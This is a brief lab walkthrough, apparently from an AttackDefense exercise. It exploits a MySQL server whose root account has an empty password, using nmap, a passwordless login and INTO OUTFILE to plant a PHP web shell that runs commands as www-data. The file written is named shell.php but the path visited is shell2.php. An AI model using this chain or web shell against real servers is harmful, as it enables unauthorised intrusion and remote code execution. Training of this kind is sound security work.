# RCE mysql

We find a webserver running via nmap on port 80

Find nmap script for mysql
```
root@attackdefense:~# ls -l /usr/share/nmap/scripts |grep mysql
-rw-r--r-- 1 root root  6634 Jan  9  2019 mysql-audit.nse
-rw-r--r-- 1 root root  2977 Jan  9  2019 mysql-brute.nse
-rw-r--r-- 1 root root  2945 Jan  9  2019 mysql-databases.nse
-rw-r--r-- 1 root root  3263 Jan  9  2019 mysql-dump-hashes.nse
-rw-r--r-- 1 root root  2020 Jan  9  2019 mysql-empty-password.nse
-rw-r--r-- 1 root root  3447 Jan  9  2019 mysql-enum.nse
-rw-r--r-- 1 root root  3482 Jan  9  2019 mysql-info.nse
-rw-r--r-- 1 root root  3714 Jan  9  2019 mysql-query.nse
-rw-r--r-- 1 root root  2811 Jan  9  2019 mysql-users.nse
-rw-r--r-- 1 root root  3265 Jan  9  2019 mysql-variables.nse
-rw-r--r-- 1 root root  6977 Jan  9  2019 mysql-vuln-cve2012-2122.nse
```

Run the script
```
root@attackdefense:~# nmap --script mysql-empty-password -p 3306 192.75.53.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-30 19:02 IST
Nmap scan report for target-1 (192.75.53.3)
Host is up (0.000044s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password: 
|_  root account has empty password
MAC Address: 02:42:C0:4B:35:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

Logging in without password
```
root@attackdefense:~# mysql -u root -h 192.75.53.3
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 6
Server version: 5.5.56-log MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

Try to write a file - success
```
MySQL [(none)]> select 'Hello world' into outfile '/tmp/temp' from mysql.user limit 1;
Query OK, 1 row affected (0.001 sec)
```

Write php RCE backdoor
```
MySQL [(none)]> select '<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;
Query OK, 1 row affected (0.001 sec)
```

We visit the path `/shell2.php?cmd=id` and we get code exec - `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
